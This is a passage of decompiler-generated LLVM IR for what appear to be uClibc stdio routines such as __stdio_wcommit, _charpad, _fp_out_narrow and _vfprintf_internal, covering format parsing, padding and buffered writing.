  %v1_8050c94 = add i32 %v0_8050c94, 32
  %v2_8050c94 = inttoptr i32 %v1_8050c94 to i32*
  %storemerge = load i32, i32* %v2_8050c94, align 4
  store i32 %storemerge, i32* @ebx, align 4
  %v1_8050c9a = icmp eq i32 %storemerge, 0
  %v1_8050c9c = icmp eq i1 %v1_8050c9a, false
  br i1 %v1_8050c9c, label %dec_label_pc_8050c5d, label %dec_label_pc_8050c97.dec_label_pc_8050cba.preheader_crit_edge

dec_label_pc_8050c97.dec_label_pc_8050cba.preheader_crit_edge: ; preds = %dec_label_pc_8050c84
  %storemerge23.pre = load i32, i32* bitcast (i32** @global_var_8062b7c.185 to i32*), align 4
  br label %dec_label_pc_8050cba.preheader

dec_label_pc_8050cba.preheader:                   ; preds = %dec_label_pc_8050c97.dec_label_pc_8050cba.preheader_crit_edge, %entry
  %storemerge23 = phi i32 [ %storemerge23.pre, %dec_label_pc_8050c97.dec_label_pc_8050cba.preheader_crit_edge ], [ %storemerge22, %entry ]
  store i32 %storemerge23, i32* @ebx, align 4
  %v1_8050cba4 = icmp eq i32 %storemerge23, 0
  %v1_8050cbc11 = icmp eq i1 %v1_8050cba4, false
  br i1 %v1_8050cbc11, label %dec_label_pc_8050ca6.preheader, label %dec_label_pc_8050cbe

dec_label_pc_8050ca6.preheader:                   ; preds = %dec_label_pc_8050cba.preheader
  br label %dec_label_pc_8050ca6

dec_label_pc_8050ca6:                             ; preds = %dec_label_pc_8050ca6.preheader, %dec_label_pc_8050cb7
  %v0_8050cae = phi i32 [ %storemerge2, %dec_label_pc_8050cb7 ], [ %storemerge23, %dec_label_pc_8050ca6.preheader ]
  %v1_8050ca6 = inttoptr i32 %v0_8050cae to i8*
  %v2_8050ca6 = load i8, i8* %v1_8050ca6, align 1
  %v3_8050ca6 = and i8 %v2_8050ca6, 64
  %v4_8050ca6 = icmp eq i8 %v3_8050ca6, 0
  br i1 %v4_8050ca6, label %dec_label_pc_8050cb7, label %dec_label_pc_8050cab

dec_label_pc_8050cab:                             ; preds = %dec_label_pc_8050ca6
  %v2_8050caf = call i32 @__stdio_wcommit(i32 %v0_8050cae)
  store i32 %v2_8050caf, i32* %eax.global-to-local, align 4
  %v0_8050cb7.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8050cb7

dec_label_pc_8050cb7:                             ; preds = %dec_label_pc_8050ca6, %dec_label_pc_8050cab
  %v0_8050cb7 = phi i32 [ %v0_8050cae, %dec_label_pc_8050ca6 ], [ %v0_8050cb7.pre, %dec_label_pc_8050cab ]
  %v1_8050cb7 = add i32 %v0_8050cb7, 32
  %v2_8050cb7 = inttoptr i32 %v1_8050cb7 to i32*
  %storemerge2 = load i32, i32* %v2_8050cb7, align 4
  store i32 %storemerge2, i32* @ebx, align 4
  %v1_8050cba = icmp eq i32 %storemerge2, 0
  %v1_8050cbc = icmp eq i1 %v1_8050cba, false
  br i1 %v1_8050cbc, label %dec_label_pc_8050ca6, label %dec_label_pc_8050cbe

dec_label_pc_8050cbe:                             ; preds = %dec_label_pc_8050cb7, %dec_label_pc_8050cba.preheader
  %v2_8050cbe = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8050cbe, i32* %eax.global-to-local, align 4
  %v2_8050cbf = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8050cbf, i32* @ebx, align 4
  store i32 %v0_8050c3a, i32* @esi, align 4
  ret i32 %v2_8050cbe

; uselistorder directives
  uselistorder i32 %storemerge2, { 1, 2, 0 }
  uselistorder i32 %storemerge23, { 2, 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 (i32)* @__stdio_init_mutex, { 2, 1, 0, 4, 3 }
  uselistorder label %dec_label_pc_8050cb7, { 1, 0 }
  uselistorder label %dec_label_pc_8050ca6, { 1, 0 }
  uselistorder label %dec_label_pc_8050c84, { 1, 0 }
  uselistorder label %dec_label_pc_8050c5d, { 1, 0 }
}

define i32 @__stdio_wcommit(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp11, i32* %stack_var_-12, align 4
  %v0_8050cc4 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_8050ccc = add i32 %arg1, 8
  %v2_8050ccc = inttoptr i32 %v1_8050ccc to i32*
  %v3_8050ccc = load i32, i32* %v2_8050ccc, align 4
  store i32 %v3_8050ccc, i32* %edx.global-to-local, align 4
  %v1_8050ccf = add i32 %arg1, 16
  %v2_8050ccf = inttoptr i32 %v1_8050ccf to i32*
  %v3_8050ccf = load i32, i32* %v2_8050ccf, align 4
  %v2_8050cd2 = sub i32 %v3_8050ccf, %v3_8050ccc
  %v12_8050cd2 = icmp eq i32 %v2_8050cd2, 0
  store i32 %v2_8050cd2, i32* %eax.global-to-local, align 4
  br i1 %v12_8050cd2, label %dec_label_pc_8050ce5, label %dec_label_pc_8050cd6

dec_label_pc_8050cd6:                             ; preds = %entry
  store i32 %v3_8050ccc, i32* %v2_8050ccf, align 4
  %v0_8050cd9 = load i32, i32* @ecx, align 4
  %v0_8050cda = load i32, i32* %eax.global-to-local, align 4
  %v0_8050cdb = load i32, i32* %edx.global-to-local, align 4
  %v0_8050cdc = load i32, i32* @ebx, align 4
  %v4_8050cdd = inttoptr i32 %v0_8050cdc to i16*
  %v5_8050cdd = call i32 @__stdio_WRITE(i16* %v4_8050cdd, i32 %v0_8050cdb, i32 %v0_8050cda, i32 %v0_8050cd9)
  store i32 %v5_8050cdd, i32* %eax.global-to-local, align 4
  %v0_8050ce5.pre = load i32, i32* @ebx, align 4
  %v2_8050ceb.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_8050ce5

dec_label_pc_8050ce5:                             ; preds = %entry, %dec_label_pc_8050cd6
  %v2_8050ceb = phi i32 [ %tmp11, %entry ], [ %v2_8050ceb.pre, %dec_label_pc_8050cd6 ]
  %v0_8050ce5 = phi i32 [ %arg1, %entry ], [ %v0_8050ce5.pre, %dec_label_pc_8050cd6 ]
  %v1_8050ce5 = add i32 %v0_8050ce5, 16
  %v2_8050ce5 = inttoptr i32 %v1_8050ce5 to i32*
  %v3_8050ce5 = load i32, i32* %v2_8050ce5, align 4
  store i32 %v3_8050ce5, i32* %eax.global-to-local, align 4
  %v2_8050ce8 = add i32 %v0_8050ce5, 8
  %v3_8050ce8 = inttoptr i32 %v2_8050ce8 to i32*
  %v4_8050ce8 = load i32, i32* %v3_8050ce8, align 4
  %v5_8050ce8 = sub i32 %v3_8050ce5, %v4_8050ce8
  store i32 %v5_8050ce8, i32* %eax.global-to-local, align 4
  store i32 %v2_8050ceb, i32* @edx, align 4
  store i32 %v0_8050cc4, i32* @ebx, align 4
  ret i32 %v5_8050ce8

; uselistorder directives
  uselistorder i32 %v0_8050ce5, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8050ce5, { 1, 0 }
}

define i32 @_charpad() local_unnamed_addr {
entry:
  %stack_var_-13 = alloca i32, align 4
  %v0_8050cf0 = load i32, i32* @edi, align 4
  %v0_8050cf1 = load i32, i32* @eax, align 4
  store i32 %v0_8050cf1, i32* @edi, align 4
  %v0_8050cf3 = load i32, i32* @esi, align 4
  %v0_8050cf4 = load i32, i32* @ecx, align 4
  store i32 %v0_8050cf4, i32* @esi, align 4
  %v0_8050cf6 = load i32, i32* @ebx, align 4
  store i32 %v0_8050cf4, i32* @ebx, align 4
  %v0_8050cfc = load i32, i32* @edx, align 4
  store i32 %v0_8050cfc, i32* %stack_var_-13, align 4
  %v1_8050d032 = icmp eq i32 %v0_8050cf4, 0
  br i1 %v1_8050d032, label %dec_label_pc_8050d1b, label %dec_label_pc_8050d07.lr.ph

dec_label_pc_8050d07.lr.ph:                       ; preds = %entry
  %v2_8050d07 = ptrtoint i32* %stack_var_-13 to i32
  br label %dec_label_pc_8050d07

dec_label_pc_8050d02:                             ; preds = %dec_label_pc_8050d07
  %v1_8050d02 = add i32 %v0_8050d02, -1
  %v8_8050d02 = icmp eq i32 %v1_8050d02, 0
  store i32 %v1_8050d02, i32* @ebx, align 4
  br i1 %v8_8050d02, label %dec_label_pc_8050d1b.loopexit, label %dec_label_pc_8050d02.dec_label_pc_8050d07_crit_edge

dec_label_pc_8050d02.dec_label_pc_8050d07_crit_edge: ; preds = %dec_label_pc_8050d02
  %v0_8050d0b.pre = load i32, i32* @edx, align 4
  %v0_8050d0c.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8050d07

dec_label_pc_8050d07:                             ; preds = %dec_label_pc_8050d02.dec_label_pc_8050d07_crit_edge, %dec_label_pc_8050d07.lr.ph
  %v0_8050d0c = phi i32 [ %v0_8050d0c.pre, %dec_label_pc_8050d02.dec_label_pc_8050d07_crit_edge ], [ %v0_8050cf1, %dec_label_pc_8050d07.lr.ph ]
  %v0_8050d0b = phi i32 [ %v0_8050d0b.pre, %dec_label_pc_8050d02.dec_label_pc_8050d07_crit_edge ], [ %v0_8050cfc, %dec_label_pc_8050d07.lr.ph ]
  %v4_8050d10 = call i32 @__stdio_fwrite(i32 %v2_8050d07, i32 1, i32 %v0_8050d0c, i32 %v0_8050d0b)
  %v8_8050d18 = icmp eq i32 %v4_8050d10, 1
  %v0_8050d02 = load i32, i32* @ebx, align 4
  br i1 %v8_8050d18, label %dec_label_pc_8050d02, label %dec_label_pc_8050d1b.loopexit

dec_label_pc_8050d1b.loopexit:                    ; preds = %dec_label_pc_8050d02, %dec_label_pc_8050d07
  %v1_8050d1e.ph = phi i32 [ %v0_8050d02, %dec_label_pc_8050d07 ], [ 0, %dec_label_pc_8050d02 ]
  %v0_8050d1e.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8050d1b

dec_label_pc_8050d1b:                             ; preds = %dec_label_pc_8050d1b.loopexit, %entry
  %v0_8050d1e = phi i32 [ 0, %entry ], [ %v0_8050d1e.pre, %dec_label_pc_8050d1b.loopexit ]
  %v1_8050d1e = phi i32 [ 0, %entry ], [ %v1_8050d1e.ph, %dec_label_pc_8050d1b.loopexit ]
  %v2_8050d1e = sub i32 %v0_8050d1e, %v1_8050d1e
  store i32 %v0_8050cf6, i32* @ebx, align 4
  store i32 %v0_8050cf3, i32* @esi, align 4
  store i32 %v0_8050cf0, i32* @edi, align 4
  ret i32 %v2_8050d1e

; uselistorder directives
  uselistorder i32 %v1_8050d02, { 1, 0 }
  uselistorder i32* %stack_var_-13, { 1, 0 }
  uselistorder label %dec_label_pc_8050d1b.loopexit, { 1, 0 }
}

define i32 @_fp_out_narrow(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4) local_unnamed_addr {
entry:
  store i32 0, i32* @ebp, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v3_8050d39 = trunc i32 %arg2 to i8
  %v5_8050d39 = icmp slt i8 %v3_8050d39, 0
  %v1_8050d3b = icmp eq i1 %v5_8050d39, false
  %tmp21 = ptrtoint i8* %arg4 to i32
  br i1 %v1_8050d3b, label %dec_label_pc_8050d6c, label %dec_label_pc_8050d3d

dec_label_pc_8050d3d:                             ; preds = %entry
  %v3_8050d44 = call i32 @strlen(i8* %arg4)
  %v0_8050d4c = load i32, i32* @ebx, align 4
  %v2_8050d4c = sub i32 %v0_8050d4c, %v3_8050d44
  store i32 %v2_8050d4c, i32* @ebx, align 4
  store i32 %v3_8050d44, i32* @esi, align 4
  %tmp23 = icmp slt i32 %v2_8050d4c, 1
  br i1 %tmp23, label %dec_label_pc_8050d6a, label %dec_label_pc_8050d54

dec_label_pc_8050d54:                             ; preds = %dec_label_pc_8050d3d
  store i32 %arg1, i32* @eax, align 4
  %v0_8050d58 = load i32, i32* @edi, align 4
  %v1_8050d58 = urem i32 %v0_8050d58, 128
  store i32 %v1_8050d58, i32* @edi, align 4
  store i32 %v2_8050d4c, i32* @ecx, align 4
  store i32 %v1_8050d58, i32* @edx, align 4
  %v0_8050d5f = call i32 @_charpad()
  %v12_8050d64 = icmp eq i32 %v0_8050d5f, %v2_8050d4c
  store i32 %v0_8050d5f, i32* @ebp, align 4
  %v1_8050d68 = icmp eq i1 %v12_8050d64, false
  br i1 %v1_8050d68, label %dec_label_pc_8050d86, label %dec_label_pc_8050d54.dec_label_pc_8050d6a_crit_edge

dec_label_pc_8050d54.dec_label_pc_8050d6a_crit_edge: ; preds = %dec_label_pc_8050d54
  %v0_8050d6a.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8050d6a

dec_label_pc_8050d6a:                             ; preds = %dec_label_pc_8050d54.dec_label_pc_8050d6a_crit_edge, %dec_label_pc_8050d3d
  %v0_8050d6a = phi i32 [ %v0_8050d6a.pre, %dec_label_pc_8050d54.dec_label_pc_8050d6a_crit_edge ], [ %v3_8050d44, %dec_label_pc_8050d3d ]
  store i32 %v0_8050d6a, i32* @ebx, align 4
  br label %dec_label_pc_8050d6c

dec_label_pc_8050d6c:                             ; preds = %entry, %dec_label_pc_8050d6a
  %v0_8050d77 = phi i32 [ %arg3, %entry ], [ %v0_8050d6a, %dec_label_pc_8050d6a ]
  %tmp24 = icmp slt i32 %v0_8050d77, 1
  br i1 %tmp24, label %dec_label_pc_8050d84, label %dec_label_pc_8050d72

dec_label_pc_8050d72:                             ; preds = %dec_label_pc_8050d6c
  %v0_8050d72 = load i32, i32* @ecx, align 4
  %v5_8050d7c = call i32 @__stdio_fwrite(i32 %tmp21, i32 %v0_8050d77, i32 %arg1, i32 %v0_8050d72)
  br label %dec_label_pc_8050d84

dec_label_pc_8050d84:                             ; preds = %dec_label_pc_8050d6c, %dec_label_pc_8050d72
  %v1_8050d84 = phi i32 [ 0, %dec_label_pc_8050d6c ], [ %v5_8050d7c, %dec_label_pc_8050d72 ]
  %v0_8050d84 = load i32, i32* @ebp, align 4
  %v2_8050d84 = add i32 %v0_8050d84, %v1_8050d84
  br label %dec_label_pc_8050d86

dec_label_pc_8050d86:                             ; preds = %dec_label_pc_8050d54, %dec_label_pc_8050d84
  %v0_8050d89 = phi i32 [ %v0_8050d5f, %dec_label_pc_8050d54 ], [ %v2_8050d84, %dec_label_pc_8050d84 ]
  ret i32 %v0_8050d89

; uselistorder directives
  uselistorder i32 %v0_8050d77, { 1, 0 }
  uselistorder i32 %v0_8050d5f, { 1, 2, 0 }
  uselistorder i32 %v1_8050d58, { 1, 0 }
  uselistorder i32 %v2_8050d4c, { 0, 2, 1, 3 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8050d86, { 1, 0 }
  uselistorder label %dec_label_pc_8050d84, { 1, 0 }
  uselistorder label %dec_label_pc_8050d6c, { 1, 0 }
}

define i32 @_vfprintf_internal(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %sf.global-to-local = alloca i1, align 1
  %st0.global-to-local = alloca x86_fp80, align 4
  %stack_var_-364 = alloca i32, align 4
  %stack_var_-348 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8050d93 = load i32, i32* @ebx, align 4
  store i32 %v0_8050d93, i32* %stack_var_-16, align 4
  %v4_8050d93 = ptrtoint i32* %stack_var_-16 to i32
  %v1_8050d94 = add i32 %v4_8050d93, -356
  %v10_8050d94 = icmp slt i32 %v1_8050d94, 0
  store i1 %v10_8050d94, i1* %sf.global-to-local, align 1
  %v4_8050d9a = ptrtoint i8* %arg2 to i32
  store i32 %v4_8050d9a, i32* @ebx, align 4
  %v2_8050da2 = ptrtoint i32* %stack_var_-348 to i32
  store i32 %v2_8050da2, i32* @esi, align 4
  %v5_8050da7 = call i32 @_ppfs_init(i32* nonnull %stack_var_-348, i32 %v4_8050d9a)
  store i32 %v5_8050da7, i32* %eax.global-to-local, align 4
  %v2_8050daf = icmp slt i32 %v5_8050da7, 0
  store i1 %v2_8050daf, i1* %sf.global-to-local, align 1
  %v1_8050db1 = icmp eq i1 %v2_8050daf, false
  br i1 %v1_8050db1, label %dec_label_pc_8050df1, label %dec_label_pc_8050db3

dec_label_pc_8050db3:                             ; preds = %entry
  %v12_8050dac = ptrtoint i32* %stack_var_-364 to i32
  %v3_8050db3 = load i32, i32* %stack_var_-348, align 4
  store i32 %v3_8050db3, i32* @ebx, align 4
  %v1_8050db7 = add i32 %v12_8050dac, -12
  %v10_8050db7 = icmp slt i32 %v1_8050db7, 0
  store i1 %v10_8050db7, i1* %sf.global-to-local, align 1
  %v5_8050dba = inttoptr i32 %v3_8050db3 to i8*
  %v3_8050dbb = call i32 @strlen(i8* %v5_8050dba)
  store i32 %v3_8050dbb, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %stack_var_-364, align 4
  %v1_8050dca = icmp eq i32 %v3_8050dbb, 0
  %v2_8050dca = icmp slt i32 %v3_8050dbb, 0
  store i1 %v2_8050dca, i1* %sf.global-to-local, align 1
  br i1 %v1_8050dca, label %dec_label_pc_805133a, label %dec_label_pc_8050dd2

dec_label_pc_8050dd2:                             ; preds = %dec_label_pc_8050db3
  %v0_8050dd2 = load i32, i32* @edx, align 4
  %v0_8050ddb = load i32, i32* @ebx, align 4
  %v6_8050ddc = call i32 @__stdio_fwrite(i32 %v0_8050ddb, i32 %v3_8050dbb, i32 %arg1, i32 %v0_8050dd2)
  store i32 %v6_8050ddc, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %stack_var_-364, align 4
  %v0_8050de9 = load i32, i32* @esp, align 4
  %v1_8050de9 = add i32 %v0_8050de9, 16
  %v7_8050de9 = icmp slt i32 %v1_8050de9, 0
  store i1 %v7_8050de9, i1* %sf.global-to-local, align 1
  br label %dec_label_pc_805133a

dec_label_pc_8050df1:                             ; preds = %entry
  %v6_8050dfb = call i32 @_ppfs_prepargs(i32 %v2_8050da2, i32 %arg3, i32 %v5_8050da7, i32 %v5_8050da7)
  store i32 %v6_8050dfb, i32* %eax.global-to-local, align 4
  %v0_8050e00 = load i32, i32* @ebx, align 4
  store i32 %v0_8050e00, i32* %edx.global-to-local, align 4
  store i32 0, i32* %stack_var_-364, align 4
  %v0_8050e0a = load i32, i32* @esp, align 4
  %v1_8050e0a = add i32 %v0_8050e0a, 16
  %v7_8050e0a = icmp slt i32 %v1_8050e0a, 0
  store i1 %v7_8050e0a, i1* %sf.global-to-local, align 1
  br label %dec_label_pc_8050e10

dec_label_pc_8050e0f:                             ; preds = %dec_label_pc_8050e16
  %v1_8050e0f = add i32 %v0_8050e1e, 1
  %v9_8050e0f = icmp slt i32 %v1_8050e0f, 0
  store i1 %v9_8050e0f, i1* %sf.global-to-local, align 1
  store i32 %v1_8050e0f, i32* @ebx, align 4
  br label %dec_label_pc_8050e10.backedge

dec_label_pc_8050e10.backedge:                    ; preds = %dec_label_pc_8050e0f, %dec_label_pc_8051320, %dec_label_pc_805132b
  %v1_8050e1a20 = phi i32 [ %v1_8050e22, %dec_label_pc_8050e0f ], [ %v3_8051320, %dec_label_pc_8051320 ], [ %v1_8050e4e, %dec_label_pc_805132b ]
  %v0_8050e1018 = phi i32 [ %v1_8050e0f, %dec_label_pc_8050e0f ], [ %v3_8051320, %dec_label_pc_8051320 ], [ %v1_805132b, %dec_label_pc_805132b ]
  %v4_8050e10.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050e10

dec_label_pc_8050e10:                             ; preds = %dec_label_pc_8050e10.backedge, %dec_label_pc_8050df1
  %v1_8050e22 = phi i32 [ %v1_8050e1a20, %dec_label_pc_8050e10.backedge ], [ %v0_8050e00, %dec_label_pc_8050df1 ]
  %v0_8050e1e = phi i32 [ %v0_8050e1018, %dec_label_pc_8050e10.backedge ], [ %v0_8050e00, %dec_label_pc_8050df1 ]
  %v4_8050e10 = phi i32 [ %v4_8050e10.pre, %dec_label_pc_8050e10.backedge ], [ %v6_8050dfb, %dec_label_pc_8050df1 ]
  %v1_8050e10 = inttoptr i32 %v0_8050e1e to i8*
  %v2_8050e10 = load i8, i8* %v1_8050e10, align 1
  %v3_8050e10 = zext i8 %v2_8050e10 to i32
  %v5_8050e10 = and i32 %v4_8050e10, -256
  %v6_8050e10 = or i32 %v3_8050e10, %v5_8050e10
  store i32 %v6_8050e10, i32* %eax.global-to-local, align 4
  %v4_8050e12 = icmp eq i8 %v2_8050e10, 0
  %v5_8050e12 = icmp slt i8 %v2_8050e10, 0
  store i1 %v5_8050e12, i1* %sf.global-to-local, align 1
  br i1 %v4_8050e12, label %dec_label_pc_8050e1a, label %dec_label_pc_8050e16

dec_label_pc_8050e16:                             ; preds = %dec_label_pc_8050e10
  %v2_8050e16 = add i8 %v2_8050e10, -37
  %v10_8050e16 = icmp eq i8 %v2_8050e16, 0
  %v11_8050e16 = icmp slt i8 %v2_8050e16, 0
  store i1 %v11_8050e16, i1* %sf.global-to-local, align 1
  %v1_8050e18 = icmp eq i1 %v10_8050e16, false
  br i1 %v1_8050e18, label %dec_label_pc_8050e0f, label %dec_label_pc_8050e1a

dec_label_pc_8050e1a:                             ; preds = %dec_label_pc_8050e16, %dec_label_pc_8050e10
  %v2_8050e1a = sub i32 %v0_8050e1e, %v1_8050e22
  %v12_8050e1a = icmp eq i32 %v2_8050e1a, 0
  %v13_8050e1a = icmp slt i32 %v2_8050e1a, 0
  store i1 %v13_8050e1a, i1* %sf.global-to-local, align 1
  br i1 %v12_8050e1a, label %dec_label_pc_8050e45, label %dec_label_pc_8050e1e

dec_label_pc_8050e1e:                             ; preds = %dec_label_pc_8050e1a
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_8050e1a, i32* @esi, align 4
  store i1 %v13_8050e1a, i1* %sf.global-to-local, align 1
  %tmp65 = icmp slt i32 %v2_8050e1a, 1
  br i1 %tmp65, label %dec_label_pc_8050e3a, label %dec_label_pc_8050e28

dec_label_pc_8050e28:                             ; preds = %dec_label_pc_8050e1e
  %v0_8050e28 = load i32, i32* @ebp, align 4
  %v1_8050e28 = load i32, i32* @esp, align 4
  %v2_8050e28 = add i32 %v1_8050e28, -4
  %v3_8050e28 = inttoptr i32 %v2_8050e28 to i32*
  store i32 %v0_8050e28, i32* %v3_8050e28, align 4
  %v1_8050e29 = add i32 %v1_8050e28, 368
  %v2_8050e29 = inttoptr i32 %v1_8050e29 to i32*
  %v3_8050e29 = load i32, i32* %v2_8050e29, align 4
  %v5_8050e29 = add i32 %v1_8050e28, -8
  %v6_8050e29 = inttoptr i32 %v5_8050e29 to i32*
  store i32 %v3_8050e29, i32* %v6_8050e29, align 4
  %v0_8050e30 = load i32, i32* @esi, align 4
  %v2_8050e30 = add i32 %v1_8050e28, -12
  %v3_8050e30 = inttoptr i32 %v2_8050e30 to i32*
  store i32 %v0_8050e30, i32* %v3_8050e30, align 4
  %v0_8050e31 = load i32, i32* %edx.global-to-local, align 4
  %v2_8050e31 = add i32 %v1_8050e28, -16
  %v3_8050e31 = inttoptr i32 %v2_8050e31 to i32*
  store i32 %v0_8050e31, i32* %v3_8050e31, align 4
  %v0_8050e32 = load i32, i32* %stack_var_-364, align 4
  %v4_8050e32 = call i32 @__stdio_fwrite(i32 %v0_8050e32, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8050e32, i32* %eax.global-to-local, align 4
  %v0_8050e37 = load i32, i32* @esp, align 4
  %v1_8050e37 = add i32 %v0_8050e37, 16
  %v7_8050e37 = icmp slt i32 %v1_8050e37, 0
  store i1 %v7_8050e37, i1* %sf.global-to-local, align 1
  %v1_8050e3a.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8050e3a

dec_label_pc_8050e3a:                             ; preds = %dec_label_pc_8050e1e, %dec_label_pc_8050e28
  %v3_8050e42 = phi i32 [ %v2_8050e1a, %dec_label_pc_8050e1e ], [ %v1_8050e3a.pre, %dec_label_pc_8050e28 ]
  %v0_8050e3a = phi i32 [ 0, %dec_label_pc_8050e1e ], [ %v4_8050e32, %dec_label_pc_8050e28 ]
  %v2_8050e3a = sub i32 %v0_8050e3a, %v3_8050e42
  %v12_8050e3a = icmp eq i32 %v2_8050e3a, 0
  %v13_8050e3a = icmp slt i32 %v2_8050e3a, 0
  store i1 %v13_8050e3a, i1* %sf.global-to-local, align 1
  %v1_8050e3c = icmp eq i1 %v12_8050e3a, false
  %v0_8051333.pre.pre = load i32, i32* @esp, align 4
  br i1 %v1_8050e3c, label %dec_label_pc_8051333, label %dec_label_pc_8050e42

dec_label_pc_8050e42:                             ; preds = %dec_label_pc_8050e3a
  %v1_8050e42 = inttoptr i32 %v0_8051333.pre.pre to i32*
  %v2_8050e42 = load i32, i32* %v1_8050e42, align 4
  %v4_8050e42 = add i32 %v2_8050e42, %v3_8050e42
  %v15_8050e42 = icmp slt i32 %v4_8050e42, 0
  store i1 %v15_8050e42, i1* %sf.global-to-local, align 1
  store i32 %v4_8050e42, i32* %v1_8050e42, align 4
  %v0_8050e45.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8050e45

dec_label_pc_8050e45:                             ; preds = %dec_label_pc_8050e1a, %dec_label_pc_8050e42
  %v0_805132b = phi i32 [ %v0_8050e1e, %dec_label_pc_8050e1a ], [ %v0_8050e45.pre, %dec_label_pc_8050e42 ]
  %v1_8050e45 = inttoptr i32 %v0_805132b to i8*
  %v2_8050e45 = load i8, i8* %v1_8050e45, align 1
  %v3_8050e45 = icmp eq i8 %v2_8050e45, 0
  %v4_8050e45 = icmp slt i8 %v2_8050e45, 0
  store i1 %v4_8050e45, i1* %sf.global-to-local, align 1
  br i1 %v3_8050e45, label %dec_label_pc_805133a, label %dec_label_pc_8050e4e

dec_label_pc_8050e4e:                             ; preds = %dec_label_pc_8050e45
  %v1_8050e4e = add i32 %v0_805132b, 1
  %v2_8050e4e = inttoptr i32 %v1_8050e4e to i8*
  %v3_8050e4e = load i8, i8* %v2_8050e4e, align 1
  %v4_8050e4e = add i8 %v3_8050e4e, -37
  %v12_8050e4e = icmp eq i8 %v4_8050e4e, 0
  %v13_8050e4e = icmp slt i8 %v4_8050e4e, 0
  store i1 %v13_8050e4e, i1* %sf.global-to-local, align 1
  store i32 %v1_8050e4e, i32* %edx.global-to-local, align 4
  br i1 %v12_8050e4e, label %dec_label_pc_805132b, label %dec_label_pc_8050e5b

dec_label_pc_8050e5b:                             ; preds = %dec_label_pc_8050e4e
  %v1_8050e5b = load i32, i32* @esp, align 4
  %v2_8050e5b = add i32 %v1_8050e5b, 16
  %v3_8050e5b = inttoptr i32 %v2_8050e5b to i32*
  store i32 %v1_8050e4e, i32* %v3_8050e5b, align 4
  %v0_8050e5f = load i32, i32* @esp, align 4
  %v1_8050e5f = add i32 %v0_8050e5f, 340
  %v2_8050e5f = inttoptr i32 %v1_8050e5f to i32*
  store i32 0, i32* %v2_8050e5f, align 4
  %v0_8050e6a = load i32, i32* @esp, align 4
  %v1_8050e6a = add i32 %v0_8050e6a, -12
  %v10_8050e6a = icmp slt i32 %v1_8050e6a, 0
  store i1 %v10_8050e6a, i1* %sf.global-to-local, align 1
  %v1_8050e6d = add i32 %v0_8050e6a, 16
  store i32 %v1_8050e6d, i32* @ebx, align 4
  %v2_8050e71 = add i32 %v0_8050e6a, -16
  %v3_8050e71 = inttoptr i32 %v2_8050e71 to i32*
  store i32 %v1_8050e6d, i32* %v3_8050e71, align 4
  %v0_8050e72 = load i32, i32* %stack_var_-364, align 4
  %v1_8050e72 = inttoptr i32 %v0_8050e72 to i32*
  %v2_8050e72 = call i32 @_ppfs_parsespec(i32* %v1_8050e72)
  store i32 %v2_8050e72, i32* %eax.global-to-local, align 4
  %v0_8050e77 = load i32, i32* @ebx, align 4
  %v1_8050e77 = load i32, i32* @esp, align 4
  %v2_8050e77 = inttoptr i32 %v1_8050e77 to i32*
  store i32 %v0_8050e77, i32* %v2_8050e77, align 4
  %v0_8050e7a = load i32, i32* %stack_var_-364, align 4
  %v1_8050e7a = call i32 @_ppfs_setargs(i32 %v0_8050e7a)
  store i32 %v1_8050e7a, i32* %eax.global-to-local, align 4
  %v0_8050e7f = load i32, i32* @esp, align 4
  %v1_8050e7f = add i32 %v0_8050e7f, 70
  %v2_8050e7f = inttoptr i32 %v1_8050e7f to i8*
  %v3_8050e7f = load i8, i8* %v2_8050e7f, align 1
  %v4_8050e7f = zext i8 %v3_8050e7f to i32
  store i32 %v4_8050e7f, i32* @edi, align 4
  %v1_8050e84 = add i32 %v0_8050e7f, 16
  %v1_8050e87 = add i32 %v0_8050e7f, 56
  %v2_8050e87 = inttoptr i32 %v1_8050e87 to i32*
  %v3_8050e87 = load i32, i32* %v2_8050e87, align 4
  %v5_8050e87 = icmp slt i32 %v3_8050e87, 0
  store i1 %v5_8050e87, i1* %sf.global-to-local, align 1
  %v1_8050e8c = add i32 %v0_8050e7f, 112
  store i32 %v1_8050e8c, i32* %edx.global-to-local, align 4
  %tmp66 = icmp slt i32 %v3_8050e87, 1
  br i1 %tmp66, label %dec_label_pc_8050e99, label %dec_label_pc_8050e92

dec_label_pc_8050e92:                             ; preds = %dec_label_pc_8050e5b
  %v2_8050e92 = zext i8 %v3_8050e7f to i32
  %v3_8050e92 = mul nuw nsw i32 %v2_8050e92, 12
  store i32 %v3_8050e92, i32* %eax.global-to-local, align 4
  %v2_8050e95 = add i32 %v0_8050e7f, 100
  %v3_8050e95 = add i32 %v2_8050e95, %v3_8050e92
  store i32 %v3_8050e95, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8050e99

